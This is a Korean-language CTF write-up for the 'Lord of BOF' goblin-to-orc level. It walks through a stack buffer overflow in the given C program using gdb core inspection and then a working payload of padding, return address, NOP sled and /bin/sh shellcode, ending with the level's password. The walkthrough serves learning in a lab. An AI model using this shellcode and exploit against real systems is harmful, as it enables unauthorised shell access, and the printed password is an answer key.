# [WriteUp]The Lord of BOF - goblin → orc

:black_nib:chykor12(sjjo0225@gmail.com)

---

```bash
[goblin@localhost goblin]$ cat orc.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);
}
```

`cobolt`와 같은 방식으로 하면 된다. 코드를 보면 `main()`의 매개변수로 준 첫 번째 문자열의 48번째 문자가 `"\xbf"`가 아니면 프로그램을 종료한다. 이 조건을 맞춰서 BOF를 발생시키고 `core` 파일을 디버깅해보자.

```bash
[goblin@localhost /tmp]$ ./orc `python -c 'print "A"*47+"\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Segmentation fault (core dumped)
[goblin@localhost /tmp]$ ls
cobolt	core  goblin  orc
[goblin@localhost /tmp]$ gdb -q -c core
Core was generated by `./orc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�'.
Program terminated with signal 11, Segmentation fault.
#0  0xbf414141 in ?? ()
(gdb) x/40wx $esp-0x40
0xbffffc70:	0x080485d3	0x08048659	0xbffffc80	0x00000017
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca0:	0x41414141	0x41414141	0x41414141	0xbf414141
0xbffffcb0:	0x00000000	0xbffffcf4	0xbffffd00	0x40013868
0xbffffcc0:	0x00000002	0x08048450	0x00000000	0x08048471
0xbffffcd0:	0x08048500	0x00000002	0xbffffcf4	0x08048390
0xbffffce0:	0x0804860c	0x4000ae60	0xbffffcec	0x40013e90
0xbffffcf0:	0x00000002	0xbffffdec	0xbffffdf2	0x00000000
0xbffffd00:	0xbffffe23	0xbffffe2c	0xbffffe46	0xbffffe65
```

버퍼의 시작 주소는 `0xbffffc80`이고, 리턴 어드레스는 `0xbffffcac`에 위치하므로 다음과 같이 공격하면 될 것이다. 리턴 어드레스는 지금까지 했던 것처럼 적당히 설정하자.

payload: dummy(`0x2c`byte) + return address(`0xbffffd10`) + NOP sled(`0x1000`byte) + shellcode(`"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`)

```bash
[goblin@localhost /tmp]$ ./orc `python -c 'print "A"*0x2c+"\x10\xfd\xff\xbf"+"\x90"*0x1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
...
bash$ whoami
orc
bash$ my-pass
euid = 504
cantata
```
